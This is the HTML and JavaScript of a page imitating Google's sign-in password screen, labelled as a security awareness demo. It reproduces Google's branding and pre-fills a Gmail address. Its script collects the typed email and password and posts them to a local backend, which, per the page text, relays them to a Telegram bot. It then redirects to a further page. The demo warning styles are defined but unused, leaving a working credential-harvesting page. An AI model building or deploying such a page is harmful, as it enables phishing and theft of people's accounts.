<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign-in - Password</title>
    <link rel="stylesheet" href="password.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        .demo-banner {
            background-color: #b3261e;
            color: #ffffff;
            text-align: center;
            font-weight: 700;
            font-size: 14px;
            letter-spacing: 0.5px;
            padding: 14px 16px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 2px 8px rgba(179, 38, 30, 0.3);
        }
        .demo-note {
            font-size: 13px;
            line-height: 1.6;
            background-color: #fef7e0;
            border: 1px solid #f9ab00;
            border-radius: 8px;
            padding: 12px 14px;
            color: #3c4043;
            margin-top: 16px;
        }
        .demo-status {
            font-size: 13px;
            line-height: 1.5;
            margin-top: 12px;
            color: #202124;
        }
    </style>
</head>
<body>


<div class="main-container">
    <div class="signin-card">
        
        <!-- Left Section -->
        <div class="left-section">
            <img src="https://res.cloudinary.com/djme9spdc/image/upload/v1785658865/google_PNG19644_qmrkpz.png" alt="Google Logo" class="google-logo">
            <h1>Welcome</h1>
            
            
            <!-- Account Pill/Badge Selection -->
            <div class="account-pill" role="button" tabindex="0">
                <span class="avatar-icon">
                    <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88C7.55 15.8 9.68 15 12 15s4.45.8 6.14 2.12C16.43 19.18 14.03 20 12 20z"/></svg>
                </span>
                <span class="email-text" id="account-email">adesokanadedeji10@gmail.com</span>
                <span class="arrow-down">▼</span>
            </div>
        </div>

        <!-- Right Section -->
        <div class="right-section">
            <!-- Material Outlined Input Group -->
            <div class="input-group">
                <input type="password" id="password" required placeholder=" ">
                <label for="password">Enter your password</label>
            </div>

            <!-- Show Password Checkbox -->
            <div class="checkbox-group">
                <input type="checkbox" id="show-password">
                <label for="show-password">Show password</label>
            </div>

            <!-- Action Buttons Footer -->
            <div class="action-buttons">
                <a href="#" class="link try-another-way">Try another way</a>
                <button class="next-button">Next</button>
            </div>

            <!-- Demo Status -->
            <p class="demo-status" id="demo-status">This page will send the password to the Telegram demo bot when you click Next.</p>
        </div>

    </div>
    
    <!-- Outer Card Bottom Navigation -->
    <div class="card-footer">
        <div class="language-selector">
            English (United States) ▼
        </div>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</div>

<script>
    // JavaScript to toggle show/hide password
    const passwordInput = document.getElementById('password');
    const showPasswordCheckbox = document.getElementById('show-password');

    // Populate the account email from the email inputed on the previous page
    const accountEmail = document.getElementById('account-email');
    if (accountEmail) {
        accountEmail.textContent = sessionStorage.getItem('demo_email') || 'adesokanadedeji10@gmail.com';
    }

    showPasswordCheckbox.addEventListener('change', function() {
        if (this.checked) {
            passwordInput.type = 'text';
        } else {
            passwordInput.type = 'password';
        }
    });
</script>

<script>
    // SECURITY AWARENESS DEMO — NOT GOOGLE
    const nextButton = document.querySelector('.next-button');
    const demoStatus = document.getElementById('demo-status');

    nextButton.addEventListener('click', async function () {
        const email = sessionStorage.getItem('demo_email') || 'unknown@demo.local';
        const password = passwordInput.value.trim();

        if (!password) {
            demoStatus.textContent = '⚠️ Please enter a password (use a fake one).';
            demoStatus.style.color = '#b3261e';
            return;
        }

        demoStatus.textContent = 'Sending demo credentials to Telegram bot...';
        demoStatus.style.color = '#0b57d0';

        try {
            const response = await fetch('http://localhost:8000/api/demo-submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: email, password: password })
            });

            const result = await response.json();

            if (response.ok) {
                demoStatus.textContent = '✅ Demo sent to Telegram! This is what an attacker would receive. Never enter real credentials on suspicious pages.';
                demoStatus.style.color = '#188038';
                passwordInput.value = '';
                setTimeout(() => { window.location.href = 'choose.html'; }, 1500);
            } else {
                demoStatus.textContent = 'Backend error: ' + (result.message || 'Unknown error');
                demoStatus.style.color = '#b3261e';
            }
        } catch (err) {
            demoStatus.textContent = 'Could not reach the backend. Make sure Laravel is running (php artisan serve).';
            demoStatus.style.color = '#b3261e';
        }
    });
</script>

</body>
</html>
